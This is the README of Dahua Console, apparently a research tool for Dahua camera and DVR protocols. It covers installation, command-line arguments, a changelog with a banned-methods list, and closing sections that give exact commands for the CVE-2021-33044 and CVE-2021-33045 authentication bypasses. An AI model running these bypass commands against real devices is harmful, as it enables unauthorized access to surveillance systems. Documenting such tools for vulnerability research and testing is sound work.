# Dahua Console

- Version: Pre-alpha
- Bugs: Indeed
- TODO: Lots of stuff

> See "Changes (2026-11)" below for what this update fixes and adds.

[Install]
```text
# Recommended: isolated install, gives you the `dahua-console` command
pipx install .

# Or from source in a virtualenv
python3 -m venv .venv && . .venv/bin/activate
pip install -e ".[dev]"
dahua-console --help

# Or run directly, as before
pip install -r requirements.txt
./Console.py --help
```

Note: `--save` / `--multihost` read and write `dhConsole.json` in the **current directory**.

[Arguments]
```text
  -h, --help            show this help message and exit
  --rhost RHOST         Remote Target Address (IP/FQDN)
  --rport RPORT         Remote Target Port
  --proto {dhip,dvrip,3des,http,https}
                        Protocol [Default: dvrip]
  --relay RELAY         ssh://<username>:<password>@<host>:<port>
  --auth AUTH           Credentials (username:password) [Default: None]
  --ssl                 Use SSL for remote connection
  -d, --debug           JSON traffic
  -dd, --ddebug         hexdump traffic
  --dump {config,service,device,discover,log,test}
                        Dump remote config
  --dump_argv DUMP_ARGV
                        ARGV to --dump (log: entry count; discover: e.g. multicast)
  --test                test w/o login attempt
  --multihost           Connect hosts from "dhConsole.json"
  --save                Save host hash to "dhConsole.json"
  --events              Subscribe to events [Default: False]
  --discover {dhip,dvrip}
                        Discover local devices
  --logon {wsse,loopback,netkeyboard,onvif:plain,onvif:digest,onvif:onvif,plain,ushield,ldap,ad,cms,local,rtsp,basic,old_digest,gui}
                        Logon types
  -f, --force           Bypass stops for dangerous commands
  --calls               Debug internal calls
```
---
## Changes (2026-11)

Bug fixes
- `method_banned`: a missing comma merged `magicBox.config` and `global.login` into one string, so neither was actually blocked.
- `dahua_dvrip_md5_hash`: with a password supplied, operator precedence dropped the `username:random:` prefix, so it disagreed with the saved-host path. **Needs confirming against a real DVRIP device.**
- `--dump service` / `--dump device` / `--dump discover` called methods that no longer exist (`listService`, `getRemoteInfo`, `deviceDiscovery`) and crashed.
- `--dump log` was rejected ("No such dump") because the handler checked for `dlog`; now takes an optional entry count via `--dump_argv`.
- Every `--dump` and `--test` crashed with a traceback when the device was unreachable; `--test` on its own also ended in an exception.
- `--auth` and `--relay` truncated passwords containing `:` (and `@` for relay).
- Connecting crashed when firmware refused `userManager.getActiveUserInfoAll` (e.g. non-admin accounts).
- `client_notify` only handled the first message of a batched packet and silently dropped the rest.
- Interactive console's catch-all exception handler had been commented out, so one bad reply killed the session.
- `binary_ip` / `unbinary_ip` swallowed Ctrl-C.

Dependencies and modern Python
- Removed the bogus `pwn~=1.0` requirement (an unrelated abandoned package), the unused `tzlocal`, and `ndjson`.
- pyOpenSSL + pycryptodome replaced by `cryptography`; EC device certificates no longer crash `certificate`.
- `requests.packages.urllib3` -> `urllib3`; `datetime.utcnow()` -> timezone-aware UTC.
- Added `pyproject.toml` (`dahua-console`, `dahua-eventviewer` commands), pytest suite with known-answer hash vectors captured from the original code, ruff, and GitHub Actions CI (Python 3.9 / 3.11 / 3.13).

New: `rpc` command (interactive) and `--dump rpc` (one-liner) call a single RPC method and print the reply,
e.g. `--dump rpc --dump_argv 'devVideoAnalyse.getCaps {"channel":0}'`. Read-only methods only (get/list/is/check)
unless `--force`; banned methods are always refused.

Not changed: protocol logic, logon modes and the pwntools-based transport.

[Release]

[Update]
2022-07-10

- Added 3des_old logon method for VTH1510CH running V2 software from 2016
  - Minor difference in the login packet data
  - Do not query device parameters on connect - will reset the connection
- Added `--restore config-file.json`
  - Loads json configuration file or parts thereof.

Example:

`./Console.py --rhost 192.168.1.x --proto 3des --auth admin:admin  --logon old_3des --dump config`

[Update]

2021-10-07

Details here: https://github.com/mcw0/PoC/blob/master/Dahua%20authentication%20bypass.txt

2021-10-06


[CVE-2021-33044]

Protocol needed: DHIP or HTTP/HTTPS (DHIP do not work with TLS/SSL @TCP/443)
```text
[proto: dhip, normally using tcp/5000]
./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto dhip --rport 5000

[proto: dhip, usually working with HTTP port as well]
./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto dhip --rport 80

[proto: http/https]
./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto http --rport 80
./Console.py --logon netkeyboard --rhost 192.168.57.20 --proto https --rport 443
```

[CVE-2021-33045]

Protocol needed: DHIP (DHIP do not work with TLS/SSL @TCP/443)
```text
[proto: dhip, normally using tcp/5000]
./Console.py --logon loopback --rhost 192.168.57.20 --proto dhip --rport 5000

[proto: dhip, usually working with HTTP port as well]
./Console.py --logon loopback --rhost 192.168.57.20 --proto dhip --rport 80
```
---

